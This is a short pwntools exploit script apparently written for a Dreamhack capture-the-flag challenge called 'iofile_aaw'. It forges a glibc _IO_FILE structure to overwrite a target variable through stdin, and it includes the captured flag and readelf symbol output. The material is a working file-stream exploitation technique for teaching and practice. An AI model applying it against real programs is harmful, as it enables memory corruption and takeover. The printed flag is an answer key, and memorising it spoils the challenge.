
#! Environment issue occurred.
#! Most mapping lower ver.. than the libc-2.27.so 

#? Remote mode is success. DH{1d60f1036d33746327c204ddb96e2dc7c79a0fcfbc7206e0716abcbb4a326c3c}

from pwn import *
p = process("./iofile_aaw")
# p = remote("host8.dreamhack.games",18217)
e = ELF("./iofile_aaw")
libc = ELF("./libc-2.23.so")
# context.log_level = "debug"

overwrite_me = e.symbols["overwrite_me"]

payload = b""
payload += p64(0xFBAD2480) #_flags
payload += p64(0) #_IO_read_ptr
payload += p64(0) #_IO_read_end
payload += p64(0) #_IO_read_base
payload += p64(0) #_IO_write_base
payload += p64(0) #_IO_write_ptr
payload += p64(0) #_IO_write_end
payload += p64(overwrite_me)      #IO_buf_base
payload += p64(overwrite_me+1024) #IO_buf_end
payload += p64(0) #_IO_save_base
payload += p64(0) #_IO_backup_base
payload += p64(0) #_IO_save_end
payload += p64(0) #_IO_marker *_markers
payload += p64(0) #_IO_FILE
payload += p64(0) #_fileno : stdin

p.sendafter(b"Data: ", payload)

p.send(p64(0xDEADBEEF) + b"\x00"*(1024-8))

p.interactive()

#root@a37017208ba9:~# readelf -s ./iofile_aaw
#68: 00000000006014a0 4 OBJECT GLOBAL DEFAULT 24 overwrite_me
#51: 00000000006010a0 1024 OBJECT GLOBAL DEFAULT 24 flag_buf